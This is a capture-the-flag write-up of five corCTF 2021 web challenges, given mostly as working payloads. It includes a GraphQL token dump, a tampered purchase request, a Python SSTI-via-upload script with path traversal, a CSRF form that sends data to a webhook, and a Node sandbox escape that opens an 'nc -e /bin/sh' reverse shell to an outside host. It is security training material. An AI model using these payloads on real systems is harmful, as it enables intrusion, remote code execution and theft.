## ====================== corCTF 2021 ======================  

### devme  
  
- Get admin token

```json
{
  "query":"{users{username,token}}"
}  
```
  
- Get flag with admin token  
  
```json  
{
  "query":"{flag (token:\"3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b\")}"
}   
```
  
`Flag: corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice}`  
  
  
### buyme  
  
My payload:  
  
```text  
POST /api/buy HTTP/1.1
Host: buyme.be.ax
Cookie: user=s%3Aahihihihi.7VJIG%2FI4pce4U516xfQMzQBXOVLTpp%2BzCZqbBPsiW7U
Content-Type: application/json
Content-Length: 79

{
  "flag":"corCTF",
  "user":{
    "flags":[],
    "user":"ahihihihi",
    "money":1e+300
  }
}
```    
  
`Flag: corctf{h0w_did_u_steal_my_flags_you_flag_h0arder??!!}`  
  
### drinkme  
  
Overwrite `decaf.html` to perform SSTI attack, we can add some random characters into file content to make `md5 hash` starts with `decaf`.
My script:  
  
```python3  
import hashlib
import string
import random
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder


url = "https://33509.drinkme.be.ax"
r = requests.Session()

def random_char(y):
       return ''.join(random.choice(string.ascii_letters) for x in range(y))

def get_flag():
	resp = r.get(url + '/decaf')
	print(resp.text)

def gen_payload(template):
	while True:
		data = template + random_char(5)
		hashed = hashlib.md5(data.encode()).hexdigest()[:5]
		if hashed == "decaf":
			return data

def send_payload(payload):
	try:
		multipart_data = MultipartEncoder(
		    fields={
		            'file': ('.html', payload, 'text/plain'),
		            'type': '../templates/', 
		            'submit': 'Draw!',
		           }
		    )
		resp = r.post(url + '/upload', data=multipart_data, headers={'Content-Type':multipart_data.content_type})
	except:
		pass

if __name__ == "__main__":
	template = "{{config.__class__.__init__.__globals__['os'].popen('cat /var/flag').read()}}"
	payload = gen_payload(template)
	print(f"[+] Found payload: {payload}")
	print(f"[+] Sending payload")
	send_payload(payload)
	print(f"[+] Try to get flag")
	get_flag()
```
  
`Flag: corctf{c4ff31n3_is_f0r_th3_we4k}`  
  
### phpme  
  
Admin's cookie set flag `Samesite=Lax`, it will be block the request from `fetch, XMLHTTPRequest` but not `form`, and use `enctype=text/plain` to avoid `urlencode form data`.  
  
My solution  
  
```html
<form id="invisible_form"  enctype="text/plain" action="https://phpme.be.ax/" method="POST" target="_blank">
  <input id="ahihi" name='{"yep":"yep yep yep", "url":"https://webhook.site/279a967d-7c3b-43e9-ab67-abf6fd32ddad","a":"' value='a"}' type="hidden">
</form>
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script type="text/javascript">
    document.getElementById("invisible_form").submit()
</script>
```  
  
`Flag: corctf{ok_h0pe_y0u_enj0yed_the_1_php_ch4ll_1n_th1s_CTF!!!}`
    
### readme  
  
My solution  
  
```html  
<html>
	<a href="http://www.google.com" name="A" class="nextasdhasd">haahahah</a>
	<a href="http://www.google.com" name="B" class="nexthehe">haadsasdahahah</a>
	<button href="http://www.google.com" name="A" class="next" onclick="function fn(){};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`child_process`).execSync(`nc <your-vps-ip> 1234 -e /bin/sh`)')}).pop();(Func())()">hehe</button>
</html>
```
 Setup listen on port 1234 and RCE  
   
`Flag: corctf{but_wh3re_w1ll_i_r3ad_my_n0vels_now??????}`
  
